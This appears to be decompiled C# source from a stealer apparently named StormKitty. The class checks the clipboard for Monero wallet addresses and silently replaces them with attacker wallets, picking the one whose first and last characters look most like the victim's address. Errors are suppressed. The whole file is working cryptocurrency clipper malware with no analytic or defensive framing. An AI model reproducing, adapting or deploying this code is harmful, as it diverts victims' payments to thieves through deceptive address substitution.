using System;
using System.Collections.Generic;
using System.Linq;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace StormKitty
{
	// Token: 0x02000049 RID: 73
	internal class CheckXMR
	{
		// Token: 0x06000130 RID: 304 RVA: 0x00009BDC File Offset: 0x00007DDC
		public static bool Clipregex(string clipboard)
		{
			string text = clipboard.Trim();
			return text.Length >= 93 && text.Length <= 96 && new Regex(CheckXMR.Key).IsMatch(text);
		}

		// Token: 0x06000131 RID: 305 RVA: 0x00009C1C File Offset: 0x00007E1C
		internal static void SetsXMR(string originalClipboardText)
		{
			try
			{
				string b = originalClipboardText.Trim();
				HashSet<string> hashSet = new HashSet<string>();
				int num = 0;
				foreach (string text in Config.walletsxmr.ToList<string>())
				{
					int num2 = CheckXMR.FirstCharFitNum(text, b);
					if (num2 >= num)
					{
						if (num2 == num)
						{
							hashSet.Add(text);
						}
						else if (num2 > num)
						{
							hashSet.Clear();
							num = num2;
							hashSet.Add(text);
							Clipboard.SetText(text);
						}
					}
				}
				int num3 = 0;
				foreach (string text2 in hashSet)
				{
					int num4 = CheckXMR.LastCharFitNum(text2, b);
					if (num4 > num3)
					{
						num3 = num4;
						Clipboard.SetText(text2);
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000132 RID: 306 RVA: 0x00009D20 File Offset: 0x00007F20
		private static int LastCharFitNum(string a, string b)
		{
			int num = 0;
			bool flag = true;
			int num2 = 0;
			while (num2 < Math.Min(a.Length, b.Length) && flag)
			{
				if (a[a.Length - 1 - num2] != b[b.Length - 1 - num2])
				{
					flag = false;
				}
				else
				{
					num++;
				}
				num2++;
			}
			return num;
		}

		// Token: 0x06000133 RID: 307 RVA: 0x00009D7C File Offset: 0x00007F7C
		private static int FirstCharFitNum(string a, string b)
		{
			int num = 0;
			bool flag = true;
			int num2 = 0;
			while (num2 < Math.Min(a.Length, b.Length) && flag)
			{
				if (a[num2] != b[num2])
				{
					flag = false;
				}
				else
				{
					num++;
				}
				num2++;
			}
			return num;
		}

		// Token: 0x04000089 RID: 137
		public static string Key = "^(4|8)[0-9AB][123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz].*$";
	}
}
